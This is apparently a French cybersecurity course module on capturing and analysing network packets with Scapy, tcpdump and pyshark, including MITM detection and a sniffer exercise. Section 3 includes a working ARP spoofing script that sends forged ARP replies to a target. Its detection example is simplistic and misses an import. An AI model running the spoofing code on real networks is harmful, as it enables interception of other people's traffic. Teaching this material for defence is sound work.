### 🟢 Module 3 : Analyse et manipulation des paquets réseau

**Objectif du module :**  
Capturer et analyser le trafic réseau pour détecter des vulnérabilités, avec une introduction à l'utilisation de Scapy pour l'analyse réseau, la capture et le filtrage des paquets, ainsi que la détection des paquets malveillants et les attaques de type Man-in-the-Middle (MITM).

---

### **1. Introduction à Scapy pour l'analyse réseau**

**Qu'est-ce que Scapy ?**

Scapy est une bibliothèque Python utilisée pour la manipulation et l’analyse des paquets réseau. Elle permet de créer, envoyer, recevoir et analyser des paquets réseau facilement. Avec Scapy, il est possible de capturer le trafic réseau en temps réel, d’analyser les paquets à la recherche de données intéressantes, et d’effectuer des attaques réseau telles que le **Man-in-the-Middle** (MITM).

#### **Notions à maîtriser :**
- **Création de paquets :** Scapy permet de créer des paquets personnalisés pour tester la sécurité d’un réseau.
- **Sniffing (ou capture) de paquets :** Scapy permet de capturer les paquets en temps réel et de les analyser.
- **Envoi de paquets :** Vous pouvez envoyer des paquets réseau pour tester la réactivité d'un service ou d'une application.

#### **Exemples pratiques :**
- **Sniffer les paquets réseau** :
    ```python
    from scapy.all import sniff

    def packet_callback(packet):
        print(packet.summary())

    sniff(prn=packet_callback, count=10)
    ```
    Ce script capture les 10 premiers paquets sur le réseau et affiche un résumé de chaque paquet.

- **Créer un paquet ICMP (Ping)** :
    ```python
    from scapy.all import IP, ICMP, send

    packet = IP(dst="192.168.1.1")/ICMP()
    send(packet)
    ```
    Ce script envoie un paquet ICMP (ping) à l’adresse IP spécifiée.

---

### **2. Capture et filtrage des paquets (tcpdump, Wireshark en Python)**

Les outils comme **tcpdump** et **Wireshark** sont largement utilisés pour analyser les paquets réseau. Cependant, ces outils ne peuvent être utilisés directement que via des interfaces graphiques ou des commandes shell. Grâce à Python, vous pouvez automatiser l’analyse et le filtrage des paquets capturés par ces outils en utilisant des bibliothèques comme **pyshark** (interface Python pour Wireshark) et **subprocess** pour exécuter des commandes externes.

#### **Notions à maîtriser :**
- **Tcpdump en Python :** Vous pouvez utiliser **subprocess** pour exécuter des commandes tcpdump et récupérer la sortie dans votre script Python.
- **Filtrage de paquets avec Wireshark :** Vous pouvez utiliser **pyshark** pour analyser les paquets de manière plus spécifique, filtrer selon différents critères (comme le type de protocole, l'adresse IP, etc.).

#### **Exemples pratiques :**
- **Utiliser tcpdump avec subprocess** pour capturer les paquets :
    ```python
    import subprocess

    def capture_packets():
        command = "sudo tcpdump -i eth0 -c 10"
        process = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE)
        output = process.communicate()[0]
        print(output.decode())

    capture_packets()
    ```

- **Utiliser pyshark pour analyser un fichier pcap** (capture de paquets) :
    ```python
    import pyshark

    cap = pyshark.FileCapture('capture.pcap', display_filter='ip')
    for packet in cap:
        print(packet)
    ```
    Ce script ouvre un fichier **pcap** et filtre les paquets pour ne montrer que ceux contenant des informations IP.

---

### **3. Détection des paquets malveillants et attaque Man-in-the-Middle (MITM)**

#### **Qu’est-ce qu’une attaque Man-in-the-Middle (MITM) ?**
Une attaque MITM consiste à intercepter les communications entre deux parties sans qu'elles en aient conscience. L'attaquant peut alors modifier les messages échangés ou espionner les informations sensibles.

##### **Objectif de cette section :**  
Détecter les paquets malveillants, comme ceux utilisés dans les attaques MITM, et les analyser pour prévenir de telles attaques dans un réseau sécurisé.

#### **Notions à maîtriser :**
- **ARP Spoofing** : L’attaquant envoie de fausses réponses ARP pour associer son adresse MAC à une adresse IP cible, redirigeant ainsi le trafic réseau.
- **SSL Stripping** : Une attaque MITM qui force la connexion HTTPS à se convertir en HTTP non sécurisé, exposant ainsi les informations sensibles.

#### **Exemples pratiques :**
- **ARP Spoofing** (attacker’s MAC address on target) avec Scapy :
    ```python
    from scapy.all import ARP, Ether, sendp

    def arp_spoof(target_ip, target_mac, gateway_ip, gateway_mac):
        # Create the ARP response
        arp_response = ARP(op=2, psrc=gateway_ip, pdst=target_ip, hwdst=target_mac)
        ether_response = Ether(dst=target_mac)/arp_response
        sendp(ether_response, iface="eth0", count=5)

    arp_spoof("192.168.1.5", "00:11:22:33:44:55", "192.168.1.1", "00:11:22:33:44:66")
    ```
    Ce script envoie des paquets ARP falsifiés à une cible pour effectuer une attaque de type ARP Spoofing.

- **Detecting MITM** : Vous pouvez capturer les paquets et vérifier les anomalies dans les entêtes de chaque paquet.
    ```python
    from scapy.all import sniff

    def detect_mitm(packet):
        if packet.haslayer(ARP):
            if packet[ARP].op == 2:  # ARP reply
                print("ARP Spoofing detected!")
                print(packet.summary())

    sniff(prn=detect_mitm, store=0)
    ```
    Ce script vérifie la présence de réponses ARP suspectes (souvent utilisées dans les attaques MITM).

---

### **4. Exercice : Créer un sniffer qui capture et analyse les paquets en temps réel**

**Objectif de l'exercice :**  
Créer un sniffer capable de capturer et d'analyser le trafic réseau en temps réel à la recherche de paquets malveillants ou de tentatives d'attaque. Vous devrez également implémenter une analyse basique pour identifier des paquets suspects ou non autorisés.

#### **Instructions :**
1. Utilisez Scapy pour capturer les paquets en temps réel.
2. Filtrez les paquets en fonction du protocole (HTTP, ICMP, TCP, UDP, etc.).
3. Implémentez une logique qui détecte les paquets suspects (ex. : ARP Spoofing, trafic non sécurisé HTTP).
4. Affichez un résumé des paquets capturés et indiquez si un paquet suspect est détecté.
5. Optionnel : Exécutez le sniffer sur un réseau local simulé dans un environnement virtuel.

#### **Exemple de structure du code :**
```python
from scapy.all import sniff, ARP, IP, TCP

def packet_analysis(packet):
    if packet.haslayer(ARP):
        print(f"ARP Packet: {packet.summary()}")
        # Vous pouvez détecter les anomalies ici

    elif packet.haslayer(IP):
        ip_src = packet[IP].src
        ip_dst = packet[IP].dst
        print(f"IP Packet: {ip_src} -> {ip_dst}")

    elif packet.haslayer(TCP):
        print(f"TCP Packet: {packet.summary()}")
        # Vous pouvez ajouter des conditions supplémentaires pour détecter les attaques

# Capture les paquets et appelle packet_analysis pour chaque paquet
sniff(prn=packet_analysis, store=0)
```

---

### **Conclusion du Module 3 :**

À la fin de ce module, vous devriez être capable de capturer et d'analyser le trafic réseau en utilisant des outils comme **Scapy**, **Wireshark**, et **tcpdump**, de détecter des attaques réseau comme **Man-in-the-Middle** et **ARP Spoofing**, et d'automatiser l'analyse des paquets avec des scripts Python.

Une fois que vous avez maîtrisé ces compétences, vous pourrez aborder le **Module 4** sur les attaques par force brute et l’exploitation des vulnérabilités.